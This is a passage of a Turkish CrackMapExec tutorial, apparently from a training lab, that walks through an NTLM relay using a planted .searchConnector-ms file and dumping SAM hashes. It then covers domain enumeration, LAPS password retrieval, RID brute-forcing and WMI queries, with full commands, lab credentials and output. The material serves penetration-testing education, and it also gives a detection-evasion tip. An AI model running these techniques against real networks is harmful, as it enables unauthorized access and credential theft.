SMB 172.16.1.10 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 172.16.1.10 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
DROP-SC 172.16.1.10 445 DC01 [+] Found writable
share: IT-Tools
DROP-SC 172.16.1.10 445 DC01 [+] Created
secret.searchConnector-ms file on the IT-Tools share
```

Bir kullanıcı **paylaşılan klasöre** eriştiğinde ve **ntlmrelayx** dinleme modunda çalışırken, kimlik bilgilerini **hedef makineye yönlendirebilmemiz** gerekir.

### NTLMRelayx ve drop-sc Kullanarak Yönlendirme

```
sudo proxychains4 -q ntlmrelayx.py -tf relay.txt -smb2support --no-http

Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth
Corporation
<SNIP>
[*] Servers started, waiting for connections
[*] SMBD-Thread-4: Connection from INLANEFREIGHT/[email protected]
controlled, attacking target smb://172.16.1.5
[*] Authenticating against smb://172.16.1.5 as INLANEFREIGHT/JULIO SUCCEED
[*] SMBD-Thread-4: Connection from INLANEFREIGHT/[email protected]
controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x29fc3535fc09fb37d22dc9f3339f6875
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:30b3783ce2abf1af70f77d0
660cf3453:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c
0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59
d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077a
ee1958e7f78070:::
localadmin:1003:aad3b435b51404eeaad3b435b51404ee:7c08d63a2f48f045971bc2236
ed3f3ac:::
sshd:1004:aad3b435b51404eeaad3b435b51404ee:d24156d278dfefe29553408e826a95f
6:::
htb:1006:aad3b435b51404eeaad3b435b51404ee:6593d8c034bbe9db50e4ce94b1943701
:::
[*] Done dumping SAM hashes for host: 172.16.1.5
[*] Stopping service RemoteRegistry

```

Son olarak, `CLEANUP=True` seçeneği ile `.searchConnector-ms` dosyasını temizleyebiliriz:


### searchConnector-ms Dosyalarını Temizleme

```
proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! -M drop-sc -o CLEANUP=True FILENAME=secret

[!] Module is not opsec safe, are you sure you want to run this? [Y/n] y
SMB 172.16.1.10 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 172.16.1.10 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
DROP-SC 172.16.1.10 445 DC01 [+] Found writable
share: IT-Tools
DROP-SC 172.16.1.10 445 DC01 [+] Deleted
secret.searchConnector-ms file on the IT-Tools share

```


LNK dosyaları genellikle bu tür saldırılar için bilinir. `.searchConnector-ms` gibi başka bir dosya türü kullanmak, fark edilmemenize yardımcı olabilir.

Sonraki bölümlerde CrackMapExec'in keşif seçeneklerini inceleyeceğiz.

---


### SMB ile Mapping ve Enumeration

CrackMapExec, geçerli bir domain kullanıcı hesabıyla numaralandırma söz konusu olduğunda çok daha fazla seçenekle birlikte gelir. En çok kullanılan seçenekleri ele aldık, ancak daha derine inelim. İşte ayrıcalıklı olmasa bile geçerli bir hesap aldığımızda kullanabileceğimiz tüm seçeneklerin listesi:

| Komut                                                                 | Açıklama                                                          |
| --------------------------------------------------------------------- | ----------------------------------------------------------------- |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --loggedon-users` | Hedefte oturum açmış kullanıcıları listeler.                      |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --sessions`       | Hedefteki aktif oturumları listeler.                              |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --disks`          | Hedefteki diskleri listeler.                                      |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --computers`      | Hedef ağdaki bilgisayarları listeler.                             |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi`            | Belirtilen WMI sorgusunu çalıştırır.                              |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi-namespace`  | WMI Namespace’ini belirtir (varsayılan: `root\cimv2`).            |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --rid-brute`      | Hedef üzerinde RID brute-force yöntemiyle kullanıcıları listeler. |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --local-groups`   | Local grupları listeler; grup belirtilirse üyelerini listeler.    |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --shares`         | Hedefteki tüm paylaşım izinlerini listeler.                       |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --users`          | Hedefteki domain kullanıcılarını listeler.                        |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --groups`         | Hedefteki domain gruplarını listeler.                             |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --pass-pol`       | Domainin password policy'sini gösterir.                           |

Daha önce çalışmamış olanları gözden geçirelim:

### Hedefteki aktif oturumları / oturum açmış kullanıcıları numaralandırma

Birden fazla hedefi ele geçirmişsek, aktif oturumları kontrol etmek faydalı olabilir, belki bir domain administrator vardır ve bu belirli hedefe odaklanmamız gerekebilir. Bir bilgisayardaki kullanıcıları tespit etmek için `--sessions` ve `--loggedon-users` seçeneklerini kullanabiliriz. Session'lar, kullanıcının hedef makinede giriş yapmıyor olsa da kullanıcı kimlik bilgileriyle oturum açıldığı anlamına gelir. Giriş yapmış kullanıcılar ise kendiliğinden anlaşılır; bir kullanıcının hedef makineye giriş yapmış olduğunu ifade eder. `BloodHound`, aktif oturumları bulmak için kullanabileceğimiz bir diğer araçtır.


### Sessions ve loggendon-users seçeneklerini kullanma

```
crackmapexec smb 10.129.203.121 -u robert -p Inlanefreight01! --loggedonusers

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01!
SMB 10.129.203.121 445 DC01 [+] Enumerated
loggedon users
SMB 10.129.203.121 445 DC01 INLANEFREIGHT\julio
logon_server: DC01
SMB 10.129.203.121 445 DC01 INLANEFREIGHT\DC01$
SMB 10.129.203.121 445 DC01
INLANEFREIGHT\svc_workstations logon_server: DC01
```

Belirli bir kullanıcıyı arıyorsak, -`-loggedon-users-filter` seçeneğini ve ardından aradığımız kullanıcının adını kullanabiliriz. Birden fazla kullanıcı arıyorsak, `regex`'i de destekler.


### Oturum açmış kullanıcılarla filtre seçeneğini kullanma

```
crackmapexec smb 10.129.203.121 -u robert -p Inlanefreight01! --loggedonusers --loggedon-users-filter julio

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB 10.129.203.121 445 DC01 [+] inlanefreight.htb\julio:Password1 (Pwn3d!)
SMB 10.129.203.121 445 DC01 [+] Enumerated loggedon users
SMB 10.129.203.121 445 DC01 INLANEFREIGHT\julio logon_server: DC01
```

Not: Genellikle, `--loggedon-users` veya `--sessions` parametrelerinin başarılı bir şekilde çalıştırılabilmesi için administrator izinleri gereklidir.



### Enumerate Computers

CME ayrıca domain bilgisayarlarını da listeleyebilir ve bunu bir LDAP isteği gerçekleştirerek yapar

### Domain'deki Bilgisayarları Numaralandırma

```
crackmapexec smb 10.129.203.121 -u robert -p Inlanefreight01! --computers

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+] inlanefreight.htb\robert:Inlanefreight01!
SMB 10.129.203.121 445 DC01 [+] Enumerated domain computer(s)
SMB 10.129.203.121 445 DC01 inlanefreight.htb\MS01$
SMB 10.129.203.121 445 DC01 inlanefreight.htb\DC01$

```


Not: Bu seçenek yalnızca SMB protokolünde mevcut olsa da, CME bir LDAP sorgusu yapmaktadır.


### Enumerate LAPS

Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarların local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL tarafından korunur, böylece yalnızca uygun kullanıcılar bunları okuyabilir veya sıfırlama talebinde bulunabilir. LAPS domain içinde kullanılıyorsa ve LAPS şifrelerini okuyabilen bir hesabı tehlikeye atarsak, `--laps` seçeneğini bir hedef listesi ile kullanabilir ve komutları çalıştırabilir veya `--sam` gibi diğer seçenekleri kullanabiliriz.


```
(mgm@kull)-/CrackMapExec
$ poetry run crackmapexec idap poudlard.wizard tom=October2021 -W laps
192.168.133.148 445 poudlard.wizard [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:poudlard.wizard) (signing:True) (SMBv1:LDAP)
192.168.133.148 389 poudlard.wizard [*] poudlard.wizard\tom:October2021
192.168.133.148 389 DC01 [*] Getting LAPS Passwords
192.168.133.148 389 DC01 Computer: DC015 Password: DW/9[pl65M0090
192.168.133.148 389 DC01 Computer: ADCS5 Password: A3)[qoAC56Hf5t
192.168.133.148 389 DC01 Computer: SOL015 Password: k9nzH6cBeFBv1-]


(mgm@kull)-/CrackMapExec
$ poetry run crackmapexec smb /tmp/hosts tom=October2021 -L laps
192.168.133.138 445 192.168.133.138 [*] Windows 10.0 Build 17763 x64 (name:ADCS) (domain:poudlard.wizard) (signing:False) (SMBv1:SMB)
192.168.133.138 445 192.168.133.167 [*] Windows Server 2016 Datacenter Evaluation 14393 x64 (name:SQL01) (domain:poudlard.wizard)
192.168.133.138 445 192.168.133.138 [*] ADCS\administrator:A3)[qoAC56Hf5t (Pwn3d!)
192.168.133.147 445 192.168.133.167 [*] SQL01\administrator:k9nzH6cBeFBv1- (Pwn3d!)


(mgm@kull)-/CrackMapExec
$ poetry run crackmapexec smb /tmp/hosts tom=October2021 -L laps -SAM
192.168.133.147 445 192.168.133.167 [*] Windows Server 2016 Datacenter Evaluation 14393 x64 (name:SQL01) (domain:poudlard.wizard)
192.168.133.148 445 192.168.133.138 [*] Windows 10.0 Build 17763 x64 (name:ADCS) (domain:poudlard.wizard) (signing:False) (SMBv1:SMB)
192.168.133.147 445 192.168.133.167 [*] SQL01\administrator:k9nzH6cBeFBv1- (Pwn3d!)
192.168.133.148 445 192.168.133.138 [*] ADCS\administrator:A3)[qoAC56Hf5t (Pwn3d!)
192.168.133.147 445 192.168.133.167 [*] Dumping SAM hashes
192.168.133.147 445 192.168.133.167 Administrator:500:aad3b435b51404eeaad3b435b51404ee:459d09c80f5cdb8cbcfc2e937b4aa84:::
192.168.133.147 445 192.168.133.167 Guest:501:aad3b435b51404eeaad3b435b51404ee:3146cfedd16ae931b73c59d7e0c089c0:::
192.168.133.147 445 192.168.133.167 DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:3146cfedd16ae931b73c59d7e0c089c0:::
192.168.133.147 445 192.168.133.167 [*] Added 7 SAM hashes to the database
192.168.133.148 445 192.168.133.138 [*] Dumping SAM hashes
192.168.133.148 445 192.168.133.138 Administrator:500:aad3b435b51404eeaad3b435b51404ee:24cf58cdd659d17a0e2e24457b531c:::
192.168.133.148 445 192.168.133.138 Guest:501:aad3b435b51404eeaad3b435b51404ee:3146cfedd16ae931b73c59d7e0c089c0:::
192.168.133.148 445 192.168.133.138 DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:3146cfedd16ae931b73c59d7e0c089c0:::
192.168.133.148 445 192.168.133.138 WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:cdde631ea957359bbc5fe18d942318ca:::
192.168.133.148 445 192.168.133.138 Toto:1000:aad3b435b51404eeaad3b435b51404ee:999e1c2a932ad329d813e12497fb5e51:::
192.168.133.148 445 192.168.133.138 Test:1001:aad3b435b51404eeaad3b435b51404ee:0210e4a570d22539c0bc588587d2a76e1:::
192.168.133.148 445 192.168.133.138 adminLocal:1002:aad3b435b51404eeaad3b435b51404ee:999e1c2a932ad329d81236f249fb3c51:::
192.168.133.148 445 192.168.133.138 [*] Added 7 SAM hashes to the database
```

Not: Eğer varsayılan administrator hesap adı "`administrator`" değilse, -`-laps username` seçeneğinden sonra kullanıcı adını ekleyin.

### Hedefteki RID'yi Brute-forcing yaparak Kullanıcıları Numaralandır --rid-brute

Nadiren kullanılan bir özellik, kullanıcı listeleri oluşturmak için `RID Bruteforce`'dur. `BloodHound` veya `PowerView` ile bir kullanıcı listesi oluşturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktır. CrackMapExec'in `--rid-brute` seçeneğini kullanarak, UserID'sini brute forcing yaparak bir kullanıcı listesi toplamak mümkündür.


### List Local Users

```
crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! --rid-brute

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SMB 10.129.203.121 445 DC01 [+] Brute forcing RIDs
SMB 10.129.203.121 445 DC01 498:
INLANEFREIGHT\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB 10.129.203.121 445 DC01 500:
INLANEFREIGHT\Aministrator (SidTypeUser)
SMB 10.129.203.121 445 DC01 501:
INLANEFREIGHT\Guest (SidTypeUser)
SMB 10.129.203.121 445 DC01 502:
INLANEFREIGHT\krbtgt (SidTypeUser)
SMB 10.129.203.121 445 DC01 512:
INLANEFREIGHT\Domain Admins (SidTypeGroup)
SMB 10.129.203.121 445 DC01 513:
INLANEFREIGHT\Domain Users (SidTypeGroup)
SMB 10.129.203.121 445 DC01 514:
INLANEFREIGHT\Domain Guests (SidTypeGroup)
SMB 10.129.203.121 445 DC01 515:
INLANEFREIGHT\Domain Computers (SidTypeGroup)
SMB 10.129.203.121 445 DC01 516:
INLANEFREIGHT\Domain Controllers (SidTypeGroup)
SMB 10.129.203.121 445 DC01 517:
INLANEFREIGHT\Cert Publishers (SidTypeAlias)
SMB 10.129.203.121 445 DC01 518:
INLANEFREIGHT\Schema Admins (SidTypeGroup)
SMB 10.129.203.121 445 DC01 519:
INLANEFREIGHT\Enterprise Admins (SidTypeGroup)
SMB 10.129.203.121 445 DC01 520:
INLANEFREIGHT\Group Policy Creator Owners (SidTypeGroup)
SMB 10.129.203.121 445 DC01 521:
INLANEFREIGHT\Read-only Domain Controllers (SidTypeGroup)
SMB 10.129.203.121 445 DC01 522:
INLANEFREIGHT\Cloneable Domain Controllers (SidTypeGroup)
SMB 10.129.203.121 445 DC01 525:
INLANEFREIGHT\Protected Users (SidTypeGroup)
SMB 10.129.203.121 445 DC01 526: INLANEFREIGHT\Key
Admins (SidTypeGroup)
SMB 10.129.203.121 445 DC01 527:
INLANEFREIGHT\Enterprise Key Admins (SidTypeGroup)
SMB 10.129.203.121 445 DC01 553: INLANEFREIGHT\RAS
and IAS Servers (SidTypeAlias)
SMB 10.129.203.121 445 DC01 571:
INLANEFREIGHT\Allowed RODC Password Replication Group (SidTypeAlias)
SMB 10.129.203.121 445 DC01 572:
INLANEFREIGHT\Denied RODC Password Replication Group (SidTypeAlias)
SMB 10.129.203.121 445 DC01 1002:
INLANEFREIGHT\DC01$ (SidTypeUser)
SMB 10.129.203.121 445 DC01 1103:
INLANEFREIGHT\DnsAdmins (SidTypeAlias)
SMB 10.129.203.121 445 DC01 1104:
INLANEFREIGHT\DnsUpdateProxy (SidTypeGroup)
SMB 10.129.203.121 445 DC01 1106:
INLANEFREIGHT\julio (SidTypeUser)
SMB 10.129.203.121 445 DC01 1107:
INLANEFREIGHT\david (SidTypeUser)
SMB 10.129.203.121 445 DC01 1108:
INLANEFREIGHT\john (SidTypeUser)
SMB 10.129.203.121 445 DC01 1109:
INLANEFREIGHT\svc_workstations (SidTypeUser)
SMB 10.129.203.121 445 DC01 2107: INLANEFREIGHT\MS01$ (SidTypeUser) SMB 10.129.203.121 445 DC01 2606: INLANEFREIGHT\carlos (SidTypeUser) SMB 10.129.203.121 445 DC01 2607: INLANEFREIGHT\robert (SidTypeUser) SMB 10.129.203.121 445 DC01 2608: INLANEFREIGHT\Linux Admins (SidTypeGroup) SMB 10.129.203.121 445 DC01 2609: INLANEFREIGHT\LINUX01$ (SidTypeUser)
SMB 10.129.203.121 445 DC01 2107:
INLANEFREIGHT\MS01$ (SidTypeUser)
SMB 10.129.203.121 445 DC01 2606:
INLANEFREIGHT\carlos (SidTypeUser)
SMB 10.129.203.121 445 DC01 2607:
INLANEFREIGHT\robert (SidTypeUser)
SMB 10.129.203.121 445 DC01 2608:
INLANEFREIGHT\Linux Admins (SidTypeGroup)
SMB 10.129.203.121 445 DC01 2609:
INLANEFREIGHT\LINUX01$ (SidTypeUser)

```

Varsayılan olarak, `--rid-brute 4000`'e kadar RID'leri zorlayarak objeleri numaralandırır. Davranışını `--rid-brute [MAX_RID]` kullanarak değiştirebiliriz.

`--rid-brute` seçeneği, brute ile zorlanan kimliklerle eşleşen kullanıcı adlarını ve diğer Active Directory objeleri almak için kullanılabilir. `NULL Authentication` etkinleştirilmişse domain hesaplarını numaralandırmak için de kullanılabilir. Bu seçeneğin bu şekillerde kullanılabileceğini unutmamak önemlidir.

### Enumerate Disks

Bazen kontrol etmeyi hatırlamamız gereken önemli bir parça, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi sağlayan bir `--disks` seçeneğine sahiptir.

### Enumerating Disks

```
crackmapexec smb 10.129.203.121 -u robert -p Inlanefreight01! --disks

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01!
SMB 10.129.203.121 445 DC01 [+] Enumerated disks
SMB 10.129.203.121 445 DC01 C:
SMB 10.129.203.121 445 DC01 D:

```


### Local ve Domain Gruplarını Numaralandırma

Local-groups ile local grupları veya `--groups` ile domain gruplarını listeleyebiliriz.

### Enumerating Local Groups

```
crackmapexec smb 10.129.203.121 -u robert -p Inlanefreight01! --localgroups
SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01!
SMB 10.129.203.121 445 DC01 [+] Enumerated local
groups
SMB 10.129.203.121 445 DC01 Cert Publishers
membercount: 0
SMB 10.129.203.121 445 DC01 RAS and IAS Servers
membercount: 0
SMB 10.129.203.121 445 DC01 Allowed RODC Password
Replication Group membercount: 0
SMB 10.129.203.121 445 DC01 Denied RODC Password
Replication Group membercount: 8
SMB 10.129.203.121 445 DC01 DnsAdmins
membercount: 0
SMB 10.129.203.121 445 DC01
SQLServer2005SQLBrowserUser$DC01 membercount: 0
SMB 10.129.203.121 445 DC01 Server Operators
membercount: 5
<SNIP>
SMB 10.129.203.121 445 DC01 Remote Management
Users membercount: 3
SMB 10.129.203.121 445 DC01 Storage Replica
Administrators membercount: 0
```

### Enumerating Domain Groups

```
crackmapexec smb 10.129.203.121 -u robert -p Inlanefreight01! --groups

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01!
SMB 10.129.203.121 445 DC01 [+] Enumerated domain
group(s)
SMB 10.129.203.121 445 DC01 LAPS_PCAdmin
membercount: 1
SMB 10.129.203.121 445 DC01 LAPS_DCAdmin
membercount: 0
SMB 10.129.203.121 445 DC01
SQLServer2005SQLBrowserUser$DC01 membercount: 0
SMB 10.129.203.121 445 DC01 Help Desk 2
membercount: 0
SMB 10.129.203.121 445 DC01 Help Desk
membercount: 0
SMB 10.129.203.121 445 DC01 Linux Admins
membercount: 3
<SNIP>
SMB 10.129.203.121 445 DC01 Guests
membercount: 2
SMB 10.129.203.121 445 DC01 Users
membercount: 3
SMB 10.129.203.121 445 DC01 Administrators
membercount: 5

```


Eğer grup üyelerini almak istiyorsak, `--groups [GRUP ADI]` kullanabiliriz.


### Group **Members**

```
crackmapexec smb 10.129.203.121 -u robert -p Inlanefreight01! --groups
Administrators

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01!
SMB 10.129.203.121 445 DC01 [+] Enumerated members
of domain group
SMB 10.129.203.121 445 DC01 inlanefreight.htb\htb
SMB 10.129.203.121 445 DC01
inlanefreight.htb\plaintext
SMB 10.129.203.121 445 DC01
inlanefreight.htb\Domain Admins
SMB 10.129.203.121 445 DC01
inlanefreight.htb\Enterprise Admins
SMB 10.129.203.121 445 DC01
inlanefreight.htb\Administrator
```

Not: Yazım sırasında `--local-group` yalnızca bir Domain Controller'a karşı çalışır ve grup adını kullanarak bir grubu sorgulamak işe yaramaz.


### WMI Sorgulama

[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows işletim sistemlerinde administrative işlemler için kullanılır. Remote bilgisayarlardaki administrative görevlerini otomatikleştirmek için WMI script dosyaları veya uygulamaları yazabiliriz. WMI, işletim sisteminin diğer bölümlerine ve System Center Operations Manager (eski adıyla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi ürünlere yönetim verileri sağlar.

Windows Management Instrumentation'nın (WMI) birincil kullanım alanlarından biri, sınıf (class) ve örnek (instance) bilgileri için WMI havuzunu sorgulama yeteneğidir. Örneğin, WMI'dan remote veya local bir sistemden shut-down olaylarını temsil eden tüm objeleri döndürmesini isteyebiliriz.

WMI, TCP port `135` ve bir dizi dinamik port kullanır: `49152-65535 (RPC dinamik portları - Windows Vista, 2008 ve üzeri)`, TCP 1024-65535 (RPC dinamik portları - Windows NT4, Windows 2000, Windows 2003) veya WMI'yı özel bir port aralığı kullanacak şekilde ayarlayabiliriz

Örneğin, remote bir bilgisayarda `Sysmon` uygulamasının çalışıp çalışmadığını sorgulamak ve `Caption` ve `ProcessId`'yi görüntülemek için WMI kullanalım, kullanacağımız WMI sorgusu S`ELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'` şeklindedir:


### Sysmon'un Çalışıp Çalışmadığını Sorgulamak için WMI Kullanma

```
crackmapexec smb 10.129.203.121 -u robert -p Inlanefreight01! --wmi
"SELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE
'%sysmon%'"

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01!
SMB 10.129.203.121 445 DC01 Caption =>
Sysmon64.exe
SMB 10.129.203.121 445 DC01 ProcessId => 3220
```

WMI, sınıflarını hiyerarşik bir namespace içinde düzenler. Bir sorgu gerçekleştirmek için, Class Name ve bulunduğu Namespace'i bilmemiz gerekir. Yukarıdaki örnekte, `Win32_Process` sınıfını `root\cimv2` namespace'inde sorguluyoruz. Namespace'i belirtmedik çünkü varsayılan olarak CME, `root\cimv2`'yi kullanır (bu bilgiyi --help menüsünde görebiliriz).

Başka bir namespace'i sorgulamak için onu belirtmemiz gerekir. Örneğin, `root\WMI` namespace'inde bulunan `MSPower_DeviceEnable` sınıfını sorgulayalım. Bu sınıf, sistem çalışırken dinamik olarak açılıp kapanması gereken cihazlar hakkında bilgi tutar. Belirli bir konuyla ilgili WMI sınıflarının nasıl bulunacağı hakkında daha fazla bilgi edinmek için [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.


### Quering root\WMI Namespace

```
crackmapexec smb 10.129.203.121 -u robert -p Inlanefreight01! --wmi
"SELECT * FROM MSPower_DeviceEnable" --wmi-namespace "root\WMI"

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01!
SMB 10.129.203.121 445 DC01 InstanceName =>
PCI\VEN_15AD&DEV_0779&SUBSYS_077915AD&REV_00\4&23f707fc&0&00B8_0
SMB 10.129.203.121 445 DC01 Active => True
SMB 10.129.203.121 445 DC01 Enable => True
SMB 10.129.203.121 445 DC01
SMB 10.129.203.121 445 DC01 InstanceName =>
PCI\VEN_8086&DEV_10D3&SUBSYS_07D015AD&REV_00\005056FFFFB9E8F200_0
SMB 10.129.203.121 445 DC01 Active => True
SMB 10.129.203.121 445 DC01 Enable => True
SMB 10.129.203.121 445 DC01
SMB 10.129.203.121 445 DC01 InstanceName =>
USB\ROOT_HUB30\5&da8887e&0&0_0
SMB 10.129.203.121 445 DC01 Active => True
SMB 10.129.203.121 445 DC01 Enable => True
SMB 10.129.203.121 445 DC01
SMB 10.129.203.121 445 DC01 InstanceName =>
USB\VID_0E0F&PID_0003&MI_00\7&2a0405e8&0&0000_0
SMB 10.129.203.121 445 DC01 Active => True
SMB 10.129.203.121 445 DC01 Enable => True
SMB 10.129.203.121 445 DC01
SMB 10.129.203.121 445 DC01 InstanceName =>
USB\VID_0E0F&PID_0003&MI_01\7&2a0405e8&0&0001_0
SMB 10.129.203.121 445 DC01 Active => True
SMB 10.129.203.121 445 DC01 Enable => True
```

Not: Genellikle, WMI'yı sorgulamak için administrative ayrıcalıklarına sahip olmamız gerekir, ancak bir administrator, WMI'yı sorgulamak için administrator olmayan bir hesabı yapılandırabilir. Bu durumda, WMI sorgularını gerçekleştirmek için administrator olmayan bir hesap kullanabiliriz.

WMI Sorgu Dili (WQL) hakkında daha fazla bilgi edinmek için [Microsoft'un Belgelerini](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi) okuyabiliriz.



Aşağıdaki bölüm LDAP ve RDP protokollerini kullanarak numaralandırmayı kapsayacaktır.

----


### LDAP and RDP Enumeration

Daha önce, CrackMapExec'te en çok kullanılan protokol olan `SMB` ile bazı numaralandırma seçeneklerini inceledik, ancak `LDAP` ve `RDP` protokolleri ile daha fazla numaralandırma seçeneği vardır

Bu bölümde, bu seçeneklerden bazıları ve hedeflerimizi nasıl daha fazla numaralandırabileceğimiz gösterilecektir

### LDAP & RDP Commands

LDAP ve RDP protokolleri aşağıdaki seçenekleri içerir:

| Komut                                                                          | Açıklama                                                                                           |
| ------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --users`                  | Etkin Domain kullanıcılarını listeler.                                                             |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --groups`                 | Domain gruplarını listeler.                                                                        |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --password-notrequired`   | `PASSWORD_NOTREQD` bayrağı olan kullanıcıları listeler.                                            |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --trusted-for-delegation` | `TRUSTED_FOR_DELEGATION` bayrağı olan kullanıcı ve bilgisyalarını listeler.                        |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --admin-count`            | `adminCount=1` derecesine sahip objeleri listeler.                                                 |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --get-sid`                | Domainin SID bilgisini alır.                                                                       |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --gmsa`                   | GMSA (Gruplandırılmış Yönetici Hizmet Hesapları) şifrelerini listeler.                             |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --nla-screenshot`          | NLA (Ağ Seviyesinde Kimlik Doğrulaması) devre dışı ise RDP giriş ekranının ekran görüntüsünü alır. |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screenshot`              | Bağlantı başarılıysa RDP oturumunun ekran görüntüsünü alır.                                        |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screentime`              | Masaüstü görüntüsü için bekleme süresini belirtir.                                                 |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --res RES`                 | Çözünürlük belirler (örnek format: WIDTHxHEIGHT, varsayılan: 1024x768).                            |

Henüz çalışmadıklarımız varsa onları gözden geçirelim.

### Enumerating Users and Groups

SMB protokolünde yaptığımız gibi, `LDAP` ile de kullanıcıları ve grupları listeleyebiliriz:

### Enumerating Users and Groups

```
crackmapexec ldap dc01.inlanefreight.htb -u robert -p Inlanefreight01! --
users --groups

SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP dc01.inlanefreight.htb 389 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
LDAP dc01.inlanefreight.htb 389 DC01 [*] Total of
records returned 32
LDAP dc01.inlanefreight.htb 389 DC01 Administrator
Built-in account for administering the computer/domain
LDAP dc01.inlanefreight.htb 389 DC01 Guest
Built-in account for guest access to the computer/domain
